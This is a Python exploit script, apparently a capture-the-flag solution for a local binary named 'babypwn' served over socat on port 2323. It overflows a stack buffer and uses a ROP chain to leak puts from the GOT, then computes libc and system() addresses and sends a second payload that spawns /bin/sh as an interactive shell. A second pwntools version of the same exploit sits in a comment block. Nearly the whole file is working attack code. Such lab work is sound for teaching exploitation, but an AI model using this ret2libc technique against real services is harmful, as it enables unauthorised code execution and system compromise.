#!/usr/bin/python

# Notes: The first six parameters are passed in registers RDI, RSI, RDX, RCX, R8, and R9. Anything beyond that is passed in the stack.
# run ./babypwn as : socat TCP-LISTEN:2323,reuseaddr,fork EXEC:./babypwn
# exploit: python exploit.py

from pwn import *
context(arch='amd64', os='linux')
from socket import *
from struct import *
import telnetlib


puts_got = 0x403fc8            	# puts()'s GOT entry		( objdump -R babypwn | grep puts )
puts_plt  = 0x401030            # address of puts@plt		( from disassamble main and observe call puts instruction )
poprdiret = 0x401203            # gadget to pop rdi; ret	( Using ropper )
binsh = 0x40302d		# address of '/bin/sh'		( find '/bin/sh' )
puts_offset = 0x0705e0		# Offset of puts in libc	( readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts )
system_offset = 0x0435d0	# Offset of system in libc	( readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system )
main_func_add = 0x401169

buf = ""
buf = 'A' * 136

buf += pack("<Q", poprdiret)
buf += pack("<Q", puts_got) 
buf += pack("<Q", puts_plt)
buf += pack("<Q", main_func_add)

# print buf


s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 2323))



print "First recieve : ", s.recv(1024)		# "Enter input" prompt
s.send(buf + "\n")              			# send buf to overwrite RIP

#d = s.recv(1024)[:6]
#print "sec recieve : ", d.splitlines()[0]		# receive server reply
#d += '\x00' * (8 - len(d))
#d = u64(d)
#print "d : ", hex(d)
#d = d.splitlines()[0]					# Leaked memory address of puts 

leak = s.recv(1024)[:6]
leak += '\x00' * (8 - len(leak))
print "leak : ", leak

puts_addr = unpack("<Q", leak)
print "puts() is at", hex(puts_addr[0])

libc_base = puts_addr[0] - puts_offset
print "libc base is", hex(libc_base)

system_addr = libc_base + system_offset
print "system() is at", hex(system_addr)

# keep socket open so gdb doesn't get a SIGTERM
#while True:
#    s.recv(1024)

buf = ""
buf = 'A' * 136

buf += pack("<Q", poprdiret)
buf += pack("<Q", binsh) 
buf += pack("<Q", system_addr)
s.send(buf + "\n")  

# get a shell
t = telnetlib.Telnet()
t.sock = s
t.interact()

# step1 : Leak system address using puts (Grab using readline and save it in variable)
# step2 : Run the binary again
# step3	: calculate the base address of libc
# step4	: calculate the address of system
# step5	: Run the payload with "/bin/sh" address and system address


'''

r = remote('127.0.0.1', 2323)
r.recvline()

r.sendline(buf)
leak = r.recvline(False)[:8]
leak += '\x00' * (8 - len(leak))
puts = u64(leak)

libc_base = puts - puts_offset
system = libc_base + system_offset

#print "puts address: ", leak

p = 'A' * 0x88
p += p64(poprdiret)
p += p64(binsh)
p += p64(system)
r.sendline(p)
r.interactive()

'''

